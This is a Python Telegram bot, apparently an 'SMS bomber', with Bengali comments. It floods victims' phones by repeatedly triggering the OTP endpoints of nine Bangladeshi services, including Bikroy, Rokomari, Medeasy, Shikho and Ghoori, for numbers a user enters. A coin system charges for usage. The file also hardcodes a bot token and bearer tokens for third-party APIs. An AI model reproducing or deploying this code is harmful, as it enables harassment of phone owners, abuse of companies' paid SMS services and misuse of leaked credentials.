import telebot
import requests
import time
from datetime import datetime
import json
import os
import random
import string
from flask import Flask, request

# Flask অ্যাপ ইনিশিয়ালাইজ করুন
app = Flask(__name__)

# বট টোকেন (Environment variable থেকে নিবে)
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8300888101:AAHp4r_zii0Vc81NTPF5Vy1feI8_mVZKXQg')
bot = telebot.TeleBot(BOT_TOKEN)

# Base Configuration for Bikroy API
BIKROY_BASE_URL = "https://bikroy.com/data/phone_number_login/verifications/phone_login"
BIKROY_HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Connection": "keep-alive"
}

# Base Configuration for PBS API
PBS_BASE_URL = "https://pbs.com.bd/login/?handler=UserGetOtp"
PBS_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json; charset=UTF-8",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "https://pbs.com.bd",
    "Referer": "https://pbs.com.bd/login",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# Base Configuration for Rokomari API
ROKOMARI_BASE_URL = "https://www.rokomari.com/otp/send"
ROKOMARI_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Accept": "*/*",
    "Origin": "https://www.rokomari.com",
    "Referer": "https://www.rokomari.com/login",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# Base Configuration for mbonlineapi.com
MBONLINEAPI_BASE_URL = "https://mbonlineapi.com/api/front/send/otp"
MBONLINEAPI_HEADERS = {
    "Authorization": "Bearer qIYOj5wHzL2P266IDNJVbXekud9eVTxc79F3L8T1Rhh1eGO7KiLqf2JQa6SB",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://meenabazaronline.com",
    "Referer": "https://meenabazaronline.com/"
}

# Base Configuration for medeasy.health
MEDEASY_BASE_URL = "https://api.medeasy.health/api/send-otp/+88"
MEDEASY_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json",
    "Origin": "https://medeasy.health",
    "Referer": "https://medeasy.health/"
}

# Base Configuration for api.osudpotro.com
OSUDPOTRO_BASE_URL = "https://api.osudpotro.com/api/v1/users/send_otp"
OSUDPOTRO_HEADERS = {
    "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lidCI6MTAxLCJpYXQiOjE3NDAwNDkyMjEsImV4cCI6MjYwMzk2MjgyMX0.N5EYLZjFdijrvOnnqntYGREgF73n4B_jQxuxneuNwwk",
    "Content-Type": "application/json;charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://osudpotro.com",
    "Referer": "https://osudpotro.com/",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# Base Configuration for www.api-care-box.click
CAREBOX_BASE_URL = "https://www.api-care-box.click/api/user/register/?version=otp"
CAREBOX_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Accept": "*/*",
    "Origin": "https://www.care-box.com",
    "Referer": "https://www.care-box.com/",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# Base Configuration for api.shikho.com
SHIKHO_BASE_URL = "https://api.shikho.com/auth/v2/send/sms"
SHIKHO_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://shikho.com",
    "Referer": "https://shikho.com/",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# Base Configuration for api.ghoorilearning.com
GHOOORI_BASE_URL = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"
GHOOORI_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://ghoorilearning.com",
    "Referer": "https://ghoorilearning.com/",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty"
}

# GitHub JSON file URL
GITHUB_JSON_URL = "https://raw.githubusercontent.com/Shimul555Mod/SMS-BOMBER-VIP/refs/heads/main/Json/s555m_sms_coin.json"

# Load user data from GitHub JSON file
def load_user_data():
    try:
        response = requests.get(GITHUB_JSON_URL, timeout=10)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        # If GitHub file is not accessible, return empty dict
        return {}

# Save user data to GitHub (using GitHub API or create a local fallback)
def save_user_data(user_data):
    try:
        # First try to save to local file (for fallback)
        with open("s555m_sms_coin.json", 'w') as file:
            json.dump(user_data, file, indent=4)
        
        print("User data saved locally. GitHub update would require API implementation.")
        
    except Exception as e:
        print(f"Error saving user data: {e}")

# Generate default tokens for a user
def generate_default_tokens():
    tokens = {
        "ifcidici775yv": "50",
        "s555m-coin-token": "50",
        "s555m-coin-token-a": "50",
        "".join(random.choices(string.ascii_lowercase + string.digits, k=12)): "50",
        "".join(random.choices(string.ascii_lowercase + string.digits, k=12)): "50"
    }
    return tokens

# Function to check internet connection
def check_internet_connection():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        return False

# Function to send SMS via Ghoori API
def send_sms_ghoori(phone_number):
    payload = {
        "mobile_no": phone_number
    }
    try:
        response = requests.post(GHOOORI_BASE_URL, json=payload, headers=GHOOORI_HEADERS, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with api.ghoorilearning.com: {e}")
        return False

# Function to send SMS via Shikho API
def send_sms_shikho(phone_number):
    payload = {
        "phone": f"88{phone_number}",
        "type": "student",
        "auth_type": "signup",
        "vendor": "shikho"
    }
    try:
        response = requests.post(SHIKHO_BASE_URL, json=payload, headers=SHIKHO_HEADERS, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with api.shikho.com: {e}")
        return False

# Function to send SMS via Osudpotro API
def send_sms_osudpotro(phone_number):
    payload = {
        "mobile": f"+88-{phone_number}",
        "deviceToken": "web",
        "language": "en",
        "os": "web"
    }
    try:
        response = requests.post(OSUDPOTRO_BASE_URL, json=payload, headers=OSUDPOTRO_HEADERS, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with api.osudpotro.com: {e}")
        return False

# Function to send SMS via Carebox API
def send_sms_carebox(phone_number):
    payload = {
        "Name": "Shimul555Mod",  # Static name for demonstration
        "Phone": f"+88{phone_number}"
    }
    try:
        response = requests.post(CAREBOX_BASE_URL, json=payload, headers=CAREBOX_HEADERS, timeout=10)
        try:
            response_data = response.json()
            otp_status = response_data.get("otp_status")
            if response.status_code == 201 and otp_status == "sent":
                return True
            else:
                return False
        except ValueError:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with www.api-care-box.click: {e}")
        return False

# Function to send SMS via Bikroy API
def send_sms_bikroy(phone_number):
    try:
        response = requests.get(f"{BIKROY_BASE_URL}?phone={phone_number}", headers=BIKROY_HEADERS, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with Bikroy API: {e}")
        return False

# Function to send SMS via PBS API
def send_sms_pbs(phone_number):
    payload = {
        "UserName": "",
        "UserPassword": "",
        "chkRememberPassword": "",
        "MobileNo": phone_number
    }
    try:
        response = requests.post(PBS_BASE_URL, json=payload, headers=PBS_HEADERS, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with PBS API: {e}")
        return False

# Function to send SMS via Rokomari API
def send_sms_rokomari(phone_number):
    params = {
        "emailOrPhone": f"88{phone_number}",  # Adding country code (Bangladesh: 88)
        "countryCode": "BD"
    }
    try:
        response = requests.post(ROKOMARI_BASE_URL, headers=ROKOMARI_HEADERS, params=params, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with Rokomari API: {e}")
        return False

# Function to send SMS via Mbonline API
def send_sms_mbonlineapi(phone_number):
    payload = {
        "CellPhone": phone_number,
        "type": "login"
    }
    try:
        response = requests.post(MBONLINEAPI_BASE_URL, json=payload, headers=MBONLINEAPI_HEADERS, timeout=10)
        try:
            response_data = response.json()
            status = response_data.get("ServiceClass", {}).get("Status")
            status_text = response_data.get("ServiceClass", {}).get("StatusText")
            if response.status_code == 202 and status == "0" and status_text == "success":
                return True
            else:
                return False
        except ValueError:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with mbonlineapi.com: {e}")
        return False

# Function to send SMS via Medeasy API
def send_sms_medeasy(phone_number):
    try:
        response = requests.get(f"{MEDEASY_BASE_URL}{phone_number}/", headers=MEDEASY_HEADERS, timeout=10)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        print(f"⚠️ Error occurred with medeasy.health: {e}")
        return False

# Show processing bar
def show_processing_bar(chat_id):
    progress_message = bot.send_message(chat_id, "⏳ Processing... [░░░░░░░░░░] 0%")
    for i in range(1, 11):
        time.sleep(0.3)  # Simulate processing time
        bar = "[" + "█" * i + " " * (10 - i) + "] " + str(i * 10) + "%"
        try:
            bot.edit_message_text(f"⏳ Processing... {bar}", chat_id, progress_message.message_id)
        except:
            pass
    try:
        bot.edit_message_text("✅ Processing Completed!", chat_id, progress_message.message_id)
    except:
        pass

# Command Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not check_internet_connection():
        bot.reply_to(message, "⚠️ No internet connection detected! Please check your network and try again.")
        return
    
    user_id = str(message.from_user.id)
    user_data = load_user_data()
    
    if user_id not in user_data:
        user_data[user_id] = {
            "username": message.from_user.username,
            "first_name": message.from_user.first_name,
            "last_name": message.from_user.last_name,
            "coins": 20,
            "status": "active",
            "start_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "tokens": generate_default_tokens(),
            "used_tokens": {}
        }
        save_user_data(user_data)
    
    markup = telebot.types.InlineKeyboardMarkup()
    join_button = telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/Shimul555Mod")
    markup.add(join_button)
    
    # Check if user is a Lifetime User
    lifetime_user = user_data[user_id].get("lifetime_user", False)
    if lifetime_user:
        user_data[user_id]["coins"] = 999999999
        user_status = "Lifetime User"
    else:
        user_status = user_data[user_id]["status"]
    
    # Send welcome message with thumbnail
    thumbnail_url = "https://raw.githubusercontent.com/Shimul555Mod/SMS-Bomber-S555M/refs/heads/main/Img/s555m_sms_bomber.jpg"
    caption = (
        f"🌟 Welcome to the SMS Sender Bot 🌟\n\n"
        f"Total Coin: {user_data[user_id]['coins']}\n"
        f"User Status: {user_status}\n\n"
        "This bot allows you to send SMS messages using the Ghoori API.\n\n"
        "✨ Available Commands:\n"
        "/start - Start the bot\n"
        "/send - Send SMS messages\n"
        "/help - Get help and instructions\n"
        "/join - Join our Telegram channel\n"
        "/network - Check your internet connection\n"
        "/check_coin - Check your coin balance\n"
        "/recharge_coin - Recharge your coin balance\n\n"
        "💡 Tip: Use /help for detailed instructions."
    )
    
    try:
        bot.send_photo(
            message.chat.id,
            thumbnail_url,
            caption=caption,
            reply_markup=markup
        )
    except:
        bot.reply_to(
            message,
            caption,
            reply_markup=markup
        )

@bot.message_handler(commands=['help'])
def send_help(message):
    bot.reply_to(
        message,
        "📖 Available Commands:\n"
        "/start - Start the bot\n"
        "/send - Send SMS messages\n"
        "/help - Show this help message\n"
        "/join - Join our Telegram channel\n"
        "/network - Check your internet connection\n"
        "/check_coin - Check your coin balance\n"
        "/recharge_coin - Recharge your coin balance\n\n"
        "To send SMS, use the /send command and follow the prompts."
    )

@bot.message_handler(commands=['network'])
def check_network(message):
    if check_internet_connection():
        bot.reply_to(message, "🌐 Internet connection is active! You are good to go.")
    else:
        bot.reply_to(message, "⚠️ No internet connection detected! Please check your network and try again.")

@bot.message_handler(commands=['join'])
def join_channel(message):
    markup = telebot.types.InlineKeyboardMarkup()
    join_button = telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/Shimul555Mod")
    markup.add(join_button)
    
    bot.reply_to(
        message,
        "📢 Join our official Telegram channel for updates and more features:",
        reply_markup=markup
    )

@bot.message_handler(commands=['check_coin'])
def check_coin(message):
    user_id = str(message.from_user.id)
    user_data = load_user_data()
    
    if user_id in user_data:
        bot.reply_to(message, f"💰 Your current coin balance is: {user_data[user_id]['coins']}")
    else:
        bot.reply_to(message, "⚠️ You are not registered. Please use /start to register.")

@bot.message_handler(commands=['recharge_coin'])
def recharge_coin(message):
    bot.reply_to(message, "🔢 Enter your recharge token:")
    bot.register_next_step_handler(message, process_recharge_token)

def process_recharge_token(message):
    user_id = str(message.from_user.id)
    user_data = load_user_data()
    
    if user_id not in user_data:
        bot.reply_to(message, "⚠️ You are not registered. Please use /start to register.")
        return
    
    token = message.text.strip()
    if token in user_data[user_id]["used_tokens"]:
        bot.reply_to(message, "⚠️ This token has already been used.")
        return
    
    if token in user_data[user_id]["tokens"]:
        coin_value = int(user_data[user_id]["tokens"][token])
        user_data[user_id]["coins"] += coin_value
        user_data[user_id]["used_tokens"][token] = "expired or used"
        save_user_data(user_data)
        bot.reply_to(message, f"✅ Token accepted! Your new coin balance is: {user_data[user_id]['coins']}")
    else:
        bot.reply_to(message, "⚠️ Invalid token. Please enter a valid token.")

@bot.message_handler(commands=['send'])
def start_sending_sms(message):
    if not check_internet_connection():
        bot.reply_to(message, "⚠️ No internet connection detected! Please check your network and try again.")
        return
    
    user_id = str(message.from_user.id)
    user_data = load_user_data()
    
    if user_id not in user_data:
        bot.reply_to(message, "⚠️ You are not registered. Please use /start to register.")
        return
    
    if user_data[user_id]["status"] == "blocked":
        bot.reply_to(message, "🚫 Your account is blocked. Please contact the admin.")
        return
    
    bot.reply_to(message, "📱 Enter phone numbers (comma-separated):")
    bot.register_next_step_handler(message, get_phone_numbers)

def get_phone_numbers(message):
    phone_numbers = message.text.split(",")
    phone_numbers = [number.strip() for number in phone_numbers]
    
    # Validate phone numbers
    for number in phone_numbers:
        if not number.startswith("01") or len(number) != 11:
            bot.reply_to(message, f"⚠️ Invalid phone number: {number}. Please enter valid Bangladeshi phone numbers.")
            return
    
    # Store phone numbers in the user's data
    bot.reply_to(message, "🔢 How many SMS do you want to send?")
    bot.register_next_step_handler(message, lambda msg: get_sms_count(msg, phone_numbers))

def get_sms_count(message, phone_numbers):
    try:
        sms_count = int(message.text)
        
        user_id = str(message.from_user.id)
        user_data = load_user_data()
        
        required_coins = sms_count * 5
        if user_data[user_id]["coins"] < required_coins:
            bot.reply_to(message, f"⚠️ Not enough coins. You need {required_coins} coins but only have {user_data[user_id]['coins']}.")
            return
        
        bot.reply_to(
            message,
            "🔍 Please confirm the details:\n"
            f"📞 Phone Numbers: {', '.join(phone_numbers)}\n"
            f"🔢 Total SMS Attempts: {sms_count}\n"
            f"💰 Coins to be deducted: {required_coins}\n"
            "Reply with 'yes' to proceed or 'no' to cancel."
        )
        bot.register_next_step_handler(message, lambda msg: confirmation(msg, phone_numbers, sms_count))
    except ValueError:
        bot.reply_to(message, "⚠️ Invalid input! Please enter a valid number.")
        bot.register_next_step_handler(message, lambda msg: get_sms_count(msg, phone_numbers))

def confirmation(message, phone_numbers, sms_count):
    confirmation = message.text.strip().lower()
    if confirmation == "yes":
        user_id = str(message.from_user.id)
        user_data = load_user_data()
        
        required_coins = sms_count * 5
        user_data[user_id]["coins"] -= required_coins
        save_user_data(user_data)
        
        success_count = 0
        failed_count = 0
        
        # Show processing bar
        show_processing_bar(message.chat.id)
        
        bot.reply_to(message, "⏳ Starting the process... Please wait...\n")
        for i in range(sms_count):
            for number in phone_numbers:
                try:
                    bot.send_message(message.chat.id, f"📞 Sending SMS to: {number} (Attempt: {i + 1}/{sms_count})")
                except:
                    pass
                
                # Send SMS using Bikroy API
                if send_sms_bikroy(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using PBS API
                if send_sms_pbs(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using Rokomari API
                if send_sms_rokomari(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using mbonlineapi.com
                if send_sms_mbonlineapi(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using medeasy.health
                if send_sms_medeasy(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using api.osudpotro.com
                if send_sms_osudpotro(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using www.api-care-box.click
                if send_sms_carebox(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using api.shikho.com
                if send_sms_shikho(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                # Send SMS using api.ghoorilearning.com
                if send_sms_ghoori(number):
                    success_count += 1
                else:
                    failed_count += 1
                
                time.sleep(2)  # Adding delay between requests
        
        bot.send_message(
            message.chat.id,
            "📊 --- Final Report ---\n"
            f"✅ Total Successful SMS: {success_count}\n"
            f"❌ Total Failed SMS: {failed_count}\n"
            f"💰 Coins deducted: {required_coins}\n"
            f"💰 Remaining coins: {user_data[user_id]['coins']}\n"
            "🎉 Process Completed!"
        )
    else:
        bot.reply_to(message, "🛑 Process canceled by the user.")

# Webhook এন্ডপয়েন্ট
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return 'Invalid content type', 403

# Webhook সেটআপ করুন
@app.route('/set_webhook', methods=['GET'])
def set_webhook():
    webhook_url = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME')}/webhook"
    bot.remove_webhook()
    bot.set_webhook(url=webhook_url)
    return f"Webhook set to {webhook_url}"

# Render পিং করার জন্য হেলথ চেক এন্ডপয়েন্ট
@app.route('/health', methods=['GET'])
def health_check():
    return 'OK', 200

@app.route('/')
def home():
    return 'Telegram SMS Bot is running!'

# Render environment চেক করুন
if os.environ.get('RENDER'):
    # Production এ Webhook ব্যবহার করুন
    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=os.environ.get('PORT', 10000))
else:
    # Development এ পোলিং ব্যবহার করুন
    print("😈 Bot is running in polling mode...")
    bot.remove_webhook()
    bot.polling()